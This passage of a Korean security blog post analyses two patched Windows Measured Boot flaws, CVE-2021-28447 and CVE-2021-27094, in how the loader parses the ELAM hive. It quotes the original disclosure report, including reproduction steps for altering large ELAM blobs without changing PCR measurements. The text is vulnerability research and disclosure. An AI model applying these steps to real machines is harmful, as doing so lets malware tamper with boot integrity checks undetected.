0x0230)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%206.png" alt="measured-boot-vuln/Untitled%206.png"></p><blockquote><p>Figure 5<br>&#xC120;&#xD0DD;&#xB41C; &#xC601;&#xC5ED; - &#xD0A4; &#xAC12;<br>&#xB178;&#xB780;&#xC0C9; - &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30; (0x215C &#xB610;&#xB294; 8540 bytes)<br>&#xBE68;&#xAC04;&#xC0C9; - &#xB370;&#xC774;&#xD130; &#xC624;&#xD504;&#xC14B; (0x1020, &#xB370;&#xC774;&#xD130;&#xAC00; 4 bytes &#xC774;&#xD558;&#xC778; &#xACBD;&#xC6B0; &#xC9C1;&#xC811; &#xC800;&#xC7A5;)<br>&#xD30C;&#xB780;&#xC0C9; - &#xAC12; &#xC720;&#xD615; (3 &#xB610;&#xB294; REG_BINARY)<br>&#xB179;&#xC0C9; - &#xAC12; &#xC774;&#xB984; ( &#x201C;Measured&#x201D;, ASCII &#xBB38;&#xC790;&#xC5F4;)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%207.png" alt="measured-boot-vuln/Untitled%207.png"></p><blockquote><p>Figure 6<br>&#xAC12; &#xB370;&#xC774;&#xD130;</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%208.png" alt="measured-boot-vuln/Untitled%208.png"></p><blockquote><p>Figure 7<br>&#xC120;&#xD0DD;&#xB41C; &#xC601;&#xC5ED; - &#xB370;&#xC774;&#xD130;&#xAC00; 16344 bytes&#xBCF4;&#xB2E4; &#xD06C;&#xACE0; &#xD558;&#xC774;&#xBE0C; &#xD615;&#xC2DD; &#xBC84;&#xC804;&#xC774; 1.4 &#xC774;&#xC0C1;&#xC778; &#xACBD;&#xC6B0;&#xC758; Big Data Record Structure<br>&#xBE68;&#xAC04;&#xC0C9; - &#xB370;&#xC774;&#xD130; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xC218; (2),<br>&#xB178;&#xB780;&#xC0C9; - &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xBAA9;&#xB85D;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B; (0x3188)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%209.png" alt="measured-boot-vuln/Untitled%209.png"></p><blockquote><p>Figure 8<br>&#xC120;&#xD0DD;&#xB41C; &#xC601;&#xC5ED; - &#xAC12; &#xB370;&#xC774;&#xD130; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xBAA9;&#xB85D;<br>&#xBE68;&#xAC04;&#xC0C9; - &#xB450; &#xAC1C;&#xC758; &#xC624;&#xD504;&#xC14B; (0x4020 &#xBC0F; 0x 8020)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2010.png" alt="measured-boot-vuln/Untitled%2010.png"></p><blockquote><p>Figure 9<br>&#xC120;&#xD0DD;&#xB41C; &#xC601;&#xC5ED; - &#xC138;&#xADF8;&#xBA3C;&#xD2B8;, &#xCCAB; &#xBC88;&#xC9F8; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC5D0;&#xB294; 16344 bytes&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC5D0;&#xB294; &#xB098;&#xBA38;&#xC9C0; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB428;</p></blockquote><p>&#xC720;&#xC2EC;&#xD788; &#xBD10;&#xC57C; &#xD560; &#xBA87; &#xAC00;&#xC9C0; &#xC138;&#xBD80; &#xC0AC;&#xD56D;</p><ol><li>&#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD558;&#xC774;&#xBE0C;&#xAC00; &#xB85C;&#xB4DC;&#xB418;&#xBA74; &#xD615;&#xC2DD; &#xC704;&#xBC18;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC704;&#xBC18;&#xC774; &#xAC10;&#xC9C0;&#xB418;&#xBA74; &#xCC38;&#xC870;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xC5EC; &#xC774;&#xB97C; &#xC218;&#xC815;&#xD558;&#xAC70;&#xB098; &#xAD00;&#xB828; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD55C;&#xB2E4;.</li><li>&#xBAA8;&#xB4E0; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC5D0; &#xC788;&#xB294; &#xC694;&#xC18C;&#xC758; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C;&#xC774; &#xD655;&#xC778;&#xB41C;&#xB2E4;. &#xB450; &#xAC1C;&#xC758; &#xD558;&#xC704; &#xD0A4; (&#xC8FC;&#xC5B4;&#xC9C4; &#xBAA9;&#xB85D;&#xC5D0; &#xC788;&#xB294; &#xD604;&#xC7AC; &#xD0A4;&#xC640; &#xC774;&#xC804; &#xD0A4;)&#xB97C; &#xBE44;&#xAD50;&#xD55C; &#xACB0;&#xACFC; &#xC798;&#xBABB;&#xB41C; &#xC21C;&#xC11C;&#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xBA74; &#xD604;&#xC7AC; &#xD0A4;&#xAC00; &#xC0AD;&#xC81C;&#xB41C;&#xB2E4;.</li><li>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD558;&#xC774;&#xBE0C;&#xAC00; &#xB9C8;&#xC6B4;&#xD2B8; &#xB418;&#xBA74; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC7A0;&#xAE30;&#xAC8C; &#xB41C;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xAC00; &#xBD80;&#xD305;&#xC744; &#xC644;&#xB8CC;&#xD558;&#xBA74; ELAM &#xD558;&#xC774;&#xBE0C;&#xB294; &#xB9C8;&#xC6B4;&#xD2B8; &#xD574;&#xC81C;&#xB41C; &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xB41C;&#xB2E4;.</li><li>ELAM &#xD558;&#xC774;&#xBE0C;&#xB294; &#xD615;&#xC2DD; &#xBC84;&#xC804; 1.5&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; Big Data Record&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C;&#xB2E4;.</li><li>&#xBD80;&#xD305; &#xC911;&#xC5D0; Windows Loader&#xB294; ELAM &#xD558;&#xC774;&#xBE0C;&#xB97C; &#xB2E8;&#xC77C; &#xBA54;&#xBAA8;&#xB9AC; &#xCCAD;&#xD06C;&#xB85C; &#xC77D;&#xB294;&#xB2E4;.</li></ol><h1 id="Measured-Boot-Vulnerabilities"><a href="#Measured-Boot-Vulnerabilities" class="headerlink" title="Measured Boot Vulnerabilities"></a>Measured Boot Vulnerabilities</h1><p>2020&#xB144; &#xB9D0;, 2021&#xB144; &#xCD08; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC545;&#xC131; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; Measured Booting &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC9C0; &#xC54A;&#xACE0; ELAM &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xC190;&#xC0C1; &#xBC0F; &#xC0AD;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD558;&#xACE0; &#xBCF4;&#xACE0;&#xD588;&#xB2E4;.</p><p>&#xD2B9;&#xD788;, Windows Loader&#xB294; ELAM &#xD558;&#xC774;&#xBE0C;&#xC5D0;&#xC11C; &#xC608;&#xC0C1;&#xB418;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC744; &#xCE21;&#xC815;&#xD558;&#xB294; &#xBC18;&#xBA74; Windows Kernel&#xC740; &#xC190;&#xC0C1;&#xB41C; ELAM &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xAC70;&#xB098; &#xD574;&#xB2F9; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC774; &#xC5C6;&#xB294; &#xD558;&#xC774;&#xBE0C;&#xC5D0;&#xC11C; &#xB2E4;&#xB978; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD655;&#xC778;&#xD574; &#xC774;&#xB7EC;&#xD55C; Loader&#xC640; Kernel&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD30C;&#xC2F1; &#xCF54;&#xB4DC;&#xC758; &#xCC28;&#xC774;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD55C;&#xB2E4;.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2011.png" alt="measured-boot-vuln/Untitled%2011.png"></p><blockquote><p>&#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC758; CVE ID</p></blockquote><p>&#xB450; &#xCDE8;&#xC57D;&#xC810; &#xBAA8;&#xB450; &#xBCF4;&#xC0C1;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC73C;&#xBA70; CVE-2021&#x2013;27094&#xC758; &#xACBD;&#xC6B0; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xB294; &#xB370; 90&#xC77C; &#xC774;&#xC0C1;&#xC774; &#xAC78;&#xB838;&#xACE0; &#xD574;&#xB2F9; &#xD328;&#xCE58;&#xB85C; &#xC778;&#xD574; &#xB370;&#xC774;&#xD130; &#xC190;&#xC0C1; &#xC774;&#xC288;&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;.</p><h2 id="CVE-2021&#x2013;28447"><a href="#CVE-2021&#x2013;28447" class="headerlink" title="CVE-2021&#x2013;28447"></a>CVE-2021&#x2013;28447</h2><p>16344 bytes&#xBCF4;&#xB2E4; &#xD070; &#xB370;&#xC774;&#xD130;&#xB85C; ELAM &#xAC12;&#xC744; &#xCE21;&#xC815;&#xD560; &#xB54C; Windows Loader&#xB294; Big Data Record&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xCE21;&#xC815; &#xC911;&#xC778; ELAM blob&#xC774; 16344 bytes&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC544;&#xB798;&#xB294; &#xCE21;&#xC815;&#xB41C; ELAM &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB514; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xD568;&#xC218;&#xC774;&#xB2E4;.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2012.png" alt="measured-boot-vuln/Untitled%2012.png"></p><blockquote><p>&#xCE21;&#xC815; &#xAC12; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xC838; &#xC624;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD568;&#xC218;</p></blockquote><p>&#xC77C;&#xBC18;&#xC801;&#xC778; &#xACBD;&#xC6B0; &#xAC12; &#xB370;&#xC774;&#xD130;&#xAC00; 16344 bytes &#xBCF4;&#xB2E4; &#xD06C;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; <code>KeyValue-&gt;Data</code> &#xD544;&#xB4DC;&#xC5D0;&#xB294; &#xC804;&#xCCB4; &#xAC12; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xACE0; <code>memmove()</code> &#xD568;&#xC218;&#xB85C; &#xD574;&#xB2F9; &#xD544;&#xB4DC;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCC0;&#xC218; <code>Heap</code>&#xC5D0; &#xBCF5;&#xC0AC;&#xD55C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xB294; &#xD558;&#xC774;&#xBE0C; &#xD615;&#xC2DD; &#xBC84;&#xC804;, &#xAC12; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC; &#xB4F1; Big Data Record&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xCF54;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB370;&#xC774;&#xD130;&#xAC00; 16344 bytes&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; <code>KeyValue-&gt;Data</code>&#xC5D0;&#xB294; &#xAC12; &#xB370;&#xC774;&#xD130; &#xB300;&#xC2E0; Big Data Record&#xB85C; &#xCC44;&#xC6CC;&#xC9C0;&#xC9C0;&#xB9CC; <code>memmove()</code> &#xD638;&#xCD9C;&#xC740; &#xC774;&#xB97C; &#xB370;&#xC774;&#xD130;&#xB85C; &#xC0DD;&#xAC01;&#xD574; Big Data Record&#xC640; &#xC774;&#xD6C4; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB85C;&#xB4DC;&#xB41C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; <code>Heap</code>&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;. </p><p>&#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xD2B9;&#xC815; &#xC870;&#xAC74;&#xC5D0;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xCE21;&#xC815;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC9C0; &#xC54A;&#xACE0; ELAM Blob&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xAC12; &#xB370;&#xC774;&#xD130; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xAC00; Big Data Record &#xC774;&#xC804;&#xC5D0;, &#xC989; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD30C;&#xC77C;&#xC758; &#xB354; &#xB0AE;&#xC740; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xBA74; &#xD799; &#xBCC0;&#xC218;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xCE21;&#xC815;&#xB418;&#xC5B4; &#xC2E4;&#xC81C; &#xAC12; &#xB370;&#xC774;&#xD130;&#xB294; &#xCE21;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xB610;&#xB294; &#xAC12; &#xB370;&#xC774;&#xD130; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xAC00; Big Data Record &#xC774;&#xD6C4;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xBA74; &#xCE21;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xCE21;&#xC815; &#xC911; &#xACC4;&#xC0B0;&#xB41C; &#xD574;&#xC2DC;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC774;&#xD6C4;&#xC758; &#xAC12; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>ELAM &#xD558;&#xC774;&#xBE0C;&#xB294; &#xBD80;&#xD305; &#xC644;&#xB8CC; &#xC774;&#xD6C4;&#xC5D0;&#xB294; &#xB85C;&#xB4DC;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xC5B4;&#xB5A4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C;&#xB4E0; (&#xC608; : HEX &#xD3B8;&#xC9D1;&#xAE30; &#xB4F1;) &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD30C;&#xC77C;&#xC744; &#xC81C;&#xD55C; &#xC5C6;&#xC774; &#xC784;&#xC758;&#xB85C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. </p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC774;&#xC804;&#xC5D0;&#xB294; Windows Loader&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC744; &#xC77D;&#xC744; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C; Big Data Record &#xCF00;&#xC774;&#xC2A4;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xB808;&#xAC70;&#xC2DC; &#xCF54;&#xB4DC;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;.</p><h3 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h3><p>Microsoft&#xB294; Windows Loader&#xC5D0;&#xC11C; Big Data Record &#xCF00;&#xC774;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xC9C0;&#xC6D0;&#xC744; &#xAD6C;&#xD604;&#xD558;&#xC5EC; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC218;&#xC815;&#xD588;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; ELAM blob&#xC758; &#xC784;&#xACC4;&#xAC12;&#xC778; 16344 bytes&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xC9C0; &#xC54A;&#xB294; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xB294; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. </p><h3 id="Original-vulnerability-report"><a href="#Original-vulnerability-report" class="headerlink" title="Original vulnerability report"></a>Original vulnerability report</h3><pre><code class="hljs c"># SummaryWhen an ELAM driver stores a binary larger than 16344 bytes in one of three measured values (called &quot;Measured&quot;, &quot;Policy&quot;, or &quot;Config&quot;) within the ELAM hive (&quot;C:\Windows\System32\config\ELAM&quot;), this binary isn&apos;t measured correctly by the Windows loader (winload.exe or winload.efi).Under specific conditions, a modification made to an ELAM blob won&apos;t result in different PCR values, thus not affecting the measured boot (since PCR values are equal to the expected ones).# Description## Steps to reproduce(Screenshots attached.)<span class="hljs-number">1.</span> Mount the ELAM hive <span class="hljs-keyword">using</span> a registry editor.<span class="hljs-number">2.</span> Add a <span class="hljs-keyword">new</span> key under the root of the ELAM hive. Assign a <span class="hljs-keyword">new</span> value to <span class="hljs-keyword">this</span> key (in <span class="hljs-keyword">this</span> report, the value will be called <span class="hljs-string">&quot;Measured&quot;</span>).<span class="hljs-number">3.</span> Write more than <span class="hljs-number">16344</span> bytes of data to that value (see: <span class="hljs-string">&quot;01-elam-blob.png&quot;</span>).<span class="hljs-number">4.</span> Unmount the ELAM hive.<span class="hljs-number">5.</span> Reboot the system.<span class="hljs-number">6.</span> During the boot, the Windows loader measures data starting from the beginning of the CM_BIG_DATA structure as pointed by the CM_KEY_VALUE structure describing the <span class="hljs-string">&quot;Measured&quot;</span> value (see: <span class="hljs-string">&quot;02-elam-blob-measured.png&quot;</span>).    Since the expected data length is larger than the CM_BIG_DATA structure, subsequent bytes of the hive file (actually, from the memory region used to store the hive file loaded) are included into the measurement (instead of actual value data).<span class="hljs-number">7.</span> After the boot, change (<span class="hljs-keyword">using</span> a registry editor) several bytes within the value data, without altering the data size (see: <span class="hljs-string">&quot;03-elam-blob-altered.png&quot;</span>).<span class="hljs-number">8.</span> Reboot the system.<span class="hljs-number">9.</span> During the boot, the Windows loader will see the same CM_BIG_DATA structure <span class="hljs-keyword">and</span> subsequent bytes as value data (see: <span class="hljs-string">&quot;04-elam-blob-altered-measured.png&quot;</span>).## Root causeThe Windows loader doesn<span class="hljs-number">&apos;</span>t support parsing value data stored <span class="hljs-keyword">using</span> the CM_BIG_DATA structure. This structure is used when the hive format version is <span class="hljs-number">1.4</span> <span class="hljs-keyword">or</span> newer <span class="hljs-keyword">and</span> value data to be stored is larger than <span class="hljs-number">16344</span> bytes.The ELAM hive uses the format version <span class="hljs-number">1.5</span>. Thus, the CM_BIG_DATA structure is supported in the NT kernel, but <span class="hljs-keyword">not</span> in the Windows loader.The OslGetBinaryValue routine (in the Windows loader) provides back a pointer to cell data containing the CM_BIG_DATA structure instead of parsing <span class="hljs-keyword">this</span> <span class="hljs-keyword">and</span> related structures <span class="hljs-keyword">and</span> then providing a pointer to consolidated data segments.## Attack scenariosFirst, ELAM blobs larger than <span class="hljs-number">16344</span> bytes aren<span class="hljs-number">&apos;</span>t measured correctly. This is a serious security issue by itself.Finally, <span class="hljs-keyword">if</span> an ELAM driver uses existing measured ELAM blobs larger than <span class="hljs-number">16344</span> bytes, a malicious usermode program could alter (corrupt <span class="hljs-keyword">or</span> downgrade) these blobs without affecting the measured boot.Such an attack is possible when:* a <span class="hljs-built_in">list</span> of cells containing value data segments is stored before the CM_BIG_DATA structure, <span class="hljs-keyword">or</span>* such value data segments are stored before the CM_BIG_DATA structure, <span class="hljs-keyword">or</span>* a <span class="hljs-built_in">list</span> of cells containing value data segments <span class="hljs-keyword">and</span> such value data segments are all stored after the CM_BIG_DATA structure, but there is a large gap after the CM_BIG_DATA structure   (which isn<span class="hljs-number">&apos;</span>t smaller than the defined value data size, so the hash calculation won<span class="hljs-number">&apos;</span>t reach the actual value data, <span class="hljs-keyword">or</span> it<span class="hljs-number">&apos;</span>s smaller than that, but the hash calculation doesn<span class="hljs-number">&apos;</span>t reach the modified bytes of actual value data).Under any specific condition defined above, changing offsets to value data segments <span class="hljs-keyword">or</span> changing value data segments respectively won<span class="hljs-number">&apos;</span>t be noticed during the measurement. (Since the hash is calculated over the internals of the hive file, but <span class="hljs-keyword">not</span> over the actual value data.)Since the ELAM hive isn<span class="hljs-number">&apos;</span>t loaded after the boot, a malicious usermode program can open it <span class="hljs-keyword">and</span> alter its data in any way possible (<span class="hljs-keyword">this</span> is <span class="hljs-keyword">not</span> limited to registry functions exposed by the Advapi32 library, the hive file can be opened <span class="hljs-keyword">and</span> edited in a HEX editor), thus exploiting any pre-existing condition defined above.## Possible solutionHandle the CM_BIG_DATA structure when parsing a registry value <span class="hljs-keyword">using</span> the Windows loader.</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xAD00;&#xB828; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC740; &#xC544;&#xB798;&#xC5D0; &#xCCA8;&#xBD80;&#xB418;&#xC5B4; &#xC788;&#xB2E4;.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2013.png" alt="measured-boot-vuln/Untitled%2013.png"></p><blockquote><p>01-elam-blob.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2014.png" alt="measured-boot-vuln/Untitled%2014.png"></p><blockquote><p>02-elam-blob-measured.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2015.png" alt="measured-boot-vuln/Untitled%2015.png"></p><blockquote><p>03-elam-blob-altered.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2016.png" alt="measured-boot-vuln/Untitled%2016.png"></p><blockquote><p>04-elam-blob-altered-measured.png</p></blockquote><h2 id="CVE-2021&#x2013;27094"><a href="#CVE-2021&#x2013;27094" class="headerlink" title="CVE-2021&#x2013;27094"></a>CVE-2021&#x2013;27094</h2><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC55E;&#xC11C; &#xC18C;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xBCF4;&#xB2E4; &#xC870;&#xAE08; &#xBCF5;&#xC7A1;&#xD558;&#xB2E4;.<br>Windows Loader &#xB610;&#xB294; Windows Kernel&#xC5D0;&#xC11C;&#xB294; &#xD558;&#xC774;&#xBE0C;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xB54C; &#xD615;&#xC2DD; &#xC704;&#xBC18;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC774; &#xAC80;&#xC0AC;&#xB294; Windows Loader&#xC5D0; &#xC758;&#xD574; &#xB85C;&#xB4DC;&#xB41C; &#xD558;&#xC774;&#xBE0C;&#xC5D0; &#xB300;&#xD574; &#xB450; &#xBC88; &#xC218;&#xD589;&#xD55C; &#xB4A4; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; Windows Kernel&#xB85C; &#xC804;&#xB2EC;&#xB41C;&#xB2E4; (ELAM &#xD558;&#xC774;&#xBE0C; &#xD3EC;&#xD568;).</p><p>&#xC774; &#xAC80;&#xC0AC; &#xB85C;&#xC9C1;&#xC740; Windwos Loader&#xC640; Kernel&#xC774; &#xC720;&#xC0AC;&#xD558;&#xAC8C; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xCC28;&#xC774;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;. &#xADF8;&#xC911; &#xD558;&#xB098;&#xAC00; Windows Loader&#xB294; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC5D0; &#xC788;&#xB294; &#xC694;&#xC18C;&#xC758; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C;&#xC744; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p>ELAM &#xD558;&#xC774;&#xBE0C;&#xB294; Windows Kernel&#xC5D0; &#xC758;&#xD574; &#xC2DC;&#xC791;&#xB41C; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xBBC0;&#xB85C; Windows Loader&#xC758; ELAM blob &#xCE21;&#xC815;&#xACFC; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC0AC;&#xC6A9; &#xC0AC;&#xC774;&#xC758; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C; &#xAC80;&#xC0AC;&#xAC00; &#xC0BD;&#xC785;&#xB41C;&#xB2E4;. Windows Loader&#xC5D0;&#xC11C; &#xCE21;&#xC815;&#xD55C; &#xD6C4; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC804; ELAM blob&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xB97C; &#xC784;&#xC758; &#xC0AD;&#xC81C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC774; &#xAC80;&#xC0AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xD558;&#xC774;&#xBE0C;&#xB97C; &#xB9C8;&#xC6B4;&#xD2B8; &#xD55C; &#xB2E4;&#xC74C; &#xD45C;&#xC900; API&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xB8E8;&#xD2B8; &#xD0A4; &#xC544;&#xB798;&#xC5D0; &#xC788;&#xB294; ELAM &#xD558;&#xC774;&#xBE0C;&#xC5D0; &#xBE48;(&#xAC12;&#xC774; &#xC5C6;&#xB294;) &#xD0A4;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; Windows Kernel&#xC774; &#xCE21;&#xC815;&#xB41C; ELAM blob&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; 